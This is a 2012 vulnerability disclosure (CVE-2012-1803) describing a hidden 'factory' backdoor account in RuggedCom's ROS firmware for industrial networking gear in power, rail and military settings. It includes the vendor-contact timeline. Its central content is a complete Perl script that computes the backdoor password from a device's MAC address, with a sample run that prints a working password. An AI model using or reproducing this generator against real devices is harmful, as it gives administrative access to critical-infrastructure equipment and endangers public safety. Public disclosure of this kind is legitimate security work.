Title: Undocumented Backdoor Access to RuggedCom Devices
Author: jc
Organization: JC CREW
Date: April 23, 2012
CVE: CVE-2012-1803

Background:
RuggedCom is one of a handful of networking vendors who capitalize on
the market for "Industrial Strength" and "Hardened" networking
equipment. You'll find their gear installed in traffic control
systems, railroad communications systems, power plants, electrical
substations, and even US military sites. Beyond simple L2 and L3
networking these devices are also used for serial-to-ip converstion in
SCADA systems and they even support modbus and dnp3. RuggedCom
published a handy guide to some of their larger customers at
www.ruggedcom.com/about/customers/. My favorite quote is from a
contractor who installed RuggedCom equipment at a US Air Force base:
"Reliability was not an option." How unfortunately apropos.

Problem:
An undocumented backdoor account exists within all released versions
of RuggedCom's Rugged Operating System (ROS®). The username for the
account, which cannot be disabled, is "factory" and its password is
dynamically generated based on the device's MAC address. Multiple
attempts have been made in the past 12 months to have this backdoor
removed and customers notified.

Exploit:
#!/usr/bin/perl
if (! defined $ARGV[0]) {
print "+========================================== \n";
print "+ RuggedCom ROS Backdoor Password Generator \n";
print "+ JC CREW April 23 2012 \n";
print "+ Usage:\n$0 macaddress \n";
print "+========================================== \n";
exit; }
$a = $ARGV[0];
$a =~ s/[^A-F0-9]+//simg;
@b = reverse split /(\S{2})/,$a;
$c = join "", @b;
$c .= "0000";
$d = hex($c) % 999999929;
print "$d\n";

Example usage:
Given a RuggedCom device with MAC address 00-0A-DC-00-00-00, run some
perl and learn that the password for "factory" is 60644375.

[jc (at) pig (dot) aids [email concealed] ros]$ ./ruggedfail.pl 00-0A-DC-00-00-00
60644375
[jc (at) pig (dot) aids [email concealed] ros]$

Shoutouts:
CERT/CC for doing great work in trying to get vendors to actually fix things.
JC CREW

Timeline:
Apr 2011 - Vendor notified directly
Jul 2011 - Vendor verbally acknowledges knowledge of backdoor,
and ceases communication.
Feb 11 2012 - US-CERT notified
Mar 12 2012 - Vendor responds to US-CERT.
Apr 06 2012 - Due to lack of further contact by vendor, CERT sets
public disclosure for April 13 2012
Apr 10 2012 - Vendor states they need another three weeks to alert
their customers, but not fix the vulnerability.
Apr 11 2012 - Clarification requested regarding need for additional three weeks.
Apr 23 2012 - No response from vendor.
Apr 23 2012 - This disclosure.

Keywords:
RuggedCom
ROS
RuggedSwitch
RuggedServer
backdoor